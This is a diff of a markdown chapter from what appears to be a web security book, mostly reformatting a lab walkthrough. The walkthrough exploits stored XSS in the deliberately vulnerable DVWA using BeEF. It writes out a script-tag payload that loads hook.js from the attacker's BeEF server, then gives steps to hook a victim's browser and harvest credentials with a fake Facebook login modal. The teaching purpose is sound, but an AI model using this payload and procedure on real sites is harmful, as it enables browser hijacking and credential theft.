@@ -205,13 +205,18 @@ _Todo_
 #### Cross-Site Scripting (XSS)
 ![](images/ThreatTags/average-verywidespread-easy-moderate.png)
 
+&nbsp;
+
 _Todo_ Discuss intricacies of XSS
+
+&nbsp;
 
 ![](images/HandsOnHack.png)
 
 The following attack was the first one of five that I demonstrated at WDCNZ in 2015. The attack after this one was a credential harvest based on a spoofed website that hypothetically was fetched due to a spear phishing attack. That particular attack can be found in chapter 6 People, under [Spear Phishing](#people-identify-risks-spear-phishing). 
 
 Theoretically in order to get to the point where you carry out this attack, you would have already been through several stages first. If you are carrying out a penetration testing engagement, it's likely you would have been through the following:
+
 1. Information gathering (probably partly even before you signed the contract with your client)
 2. Vulnerability scanning
 3. Vulnerability searching
@@ -219,62 +224,34 @@ Theoretically in order to get to the point where you carry out this attack, you 
 If you're working within a development team you may have found out some other way that your project was vulnerable to XSS.
 
 How ever you got to this point, you're going to want to exhibit the fault. One of the most effective ways to do this is by using BeEF. BeEF clearly shows what is possible when you have an XSS vulnerability in scope and is an excellent tool for effortlessly demonstrating the severity of the fault to all team members and stakeholders.  
-One of BeEF's primary reasons to exist is to exploit the fact that many security philosophies seem to forget how easy it is to go straight through hardened network perimeters and attack the soft mushy insides of a sub network. Exposing XSS faults is one of BeEF's attributes. 
+One of BeEF's primary reasons to exist is to exploit the fact that many security philosophies seem to forget how easy it is to go straight through hardened network perimeters and attack the soft mushy insides of a sub network (as discussed in chapter 3 Physical, under the [Fortress Mentality](#physical-identify-risks-fortress-mentality) section). Exposing XSS faults is one of BeEF's attributes. 
 
-You can find the video of how it is played out [here](https://www.youtube.com/watch?v=92AWyUfJDUw).
+You can find the video of how this attack is played out [here](https://www.youtube.com/watch?v=92AWyUfJDUw).
 
 I> ## Synopsis
 I>
-I> In this exercise, I've used the Dam Vulnerable Web App (dvwa), as it has the types of XSS vulnerabilities we need in order to demonstrate the power of BeEF. dvwa is included in the OWASP Broken Web Application ([owaspbwa](https://www.owasp.org/index.php/OWASP_Vulnerable_Web_Applications_Directory_Project)) turn-key VM along with many other useful purposely vulnerable projects.
+I> In this exercise, I've used the Dam Vulnerable Web App (dvwa), as it has the types of XSS vulnerabilities we need in order to demonstrate the power of BeEF. dvwa is included in the OWASP Broken Web Application ([owaspbwa](https://www.owasp.org/index.php/OWASP_Vulnerable_Web_Applications_Directory_Project)) turn-key VM, along with many other useful purposely vulnerable projects.  
 I> We use BeEF to exploit an XSS vulnerability in dvwa and carry out a simple attack in which we coerce the target to enter their credentials for a website and send them to our BeEF communications server unknowingly.
 
 {icon=bomb}
 G> ## The Play
 G>
-G> Make sure you have the owaspbwa [configured](https://code.google.com/p/owaspbwa/wiki/UserGuide) and running in your lab.
+G> Make sure you have the owaspbwa [configured](https://code.google.com/p/owaspbwa/wiki/UserGuide) and running in your lab.  
 G> From the directory that you have BeEF installed, run the BeEF ruby script: `./beef`  
-G> Log into the BeEF UI at `http://localhost:3000/ui/authentication` (or using https if you've configured TLS) with the user and password that you setup in the BeEF root config.yaml
-G> Open another browser tab and log-in to the dvwa
-G> Browse to "XSS stored"
-G> Enter some text in the Name field and some text in the Message field
-G> Enable foxy proxy so that your request goes to the same port that burp suite is going to be listening on
-G> Fire up burp
-G> Back in the dvwa send your request by clicking on the Sign Guestbook button
-G> Switch back to burp -> Proxy tab and the request should be waiting for you. You now need to replace the text you used in the Message field `mtxMessage` with `<script src="http://<BeEF comms server IP address>:3000/hook.js"></script>` and forward the request.
-G> You can disable FoxyProxy now too
-G> Now on your victims machine, the victim can log into dvwa and browse to the same "XSS stored" page. Now as the attacker, you'll now notice that the BeEF Web UI shows a node with the victims IP address. This means BeEF has the victims browser hooked. The victims browser is now a zombie, continuously polling the BeEF comms server for commands to execute on its behalf.
-G> If you open the victims browser developer tools, you'll be able to inspect the communications and the JavaScript within the hook.js file
-G> Back in the BeEF web UI you can explore the modules that you can launch against the victims browser. You can view the types of attacks you can carry out on the [BeEF projects wiki](https://github.com/beefproject/beef/wiki/BeEF-modules).
-G> If you select the victims node and click on the Commands tab in the BeEF web UI, then in the Module Tree under Social Engineering select the "Pretty Theft" node. There are some options to configure, but even selecting the default of Facebook if you know your target is already an avid FB user should work fine. You would of course know this if you did due diligence in the reconnaissance stage.
-G> Click on the Execute button and on the next request -> response from the hook.js, the victims browser should pop a "Facebook Session Timed Out" modal. To get rid of this modal, the victim must enter their credentials and Log-in. There is no cancel or 'x' button. Once the victim has sent their credentials, they will be visible in the Command results of the BeEF web UI.
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+G> Log into the BeEF UI at `http://localhost:3000/ui/authentication` (or using https if you've configured TLS) with the user and password that you setup in the BeEF root config.yaml  
+G> Open another browser tab and log-in to the dvwa  
+G> Browse to "XSS stored"  
+G> Enter some text in the Name field and some text in the Message field  
+G> Enable foxy proxy so that your request goes to the same port that burp suite is going to be listening on  
+G> Fire up burp  
+G> Back in the dvwa send your request by clicking on the Sign Guestbook button  
+G> Switch back to burp -> Proxy tab and the request should be waiting for you. You now need to replace the text you used in the Message field `mtxMessage` with `<script src="http://<BeEF comms server IP address>:3000/hook.js"></script>` and forward the request.  
+G> You can disable FoxyProxy now too  
+G> Now on your victims machine, the victim can log into dvwa and browse to the same "XSS stored" page. Now as the attacker, you'll now notice that the BeEF Web UI shows a node with the victims IP address. This means BeEF has the victims browser hooked. The victims browser is now a zombie, continuously polling the BeEF comms server for commands to execute on its behalf.  
+G> If you open the victims browser developer tools, you'll be able to inspect the communications and the JavaScript within the hook.js file  
+G> Back in the BeEF web UI you can explore the modules that you can launch against the victims browser. You can view the types of attacks you can carry out on the [BeEF projects wiki](https://github.com/beefproject/beef/wiki/BeEF-modules).  
+G> If you select the victims node and click on the Commands tab in the BeEF web UI, then in the Module Tree under Social Engineering select the "Pretty Theft" node. There are some options to configure, but even selecting the default of Facebook if you know your target is already an avid FB user should work fine. You would of course know this if you did due diligence in the reconnaissance stage.  
+G> Click on the Execute button and on the next request -> response from the hook.js, the victims browser should pop a "Facebook Session Timed Out" modal. To get rid of this modal, the victim must enter their credentials and Log-in. There is no cancel or 'x' button. Once the victim has sent their credentials, they will be visible in the Command results of the BeEF web UI.  
 
 {#web-application-identify-risks-sqli}
 #### SQLi
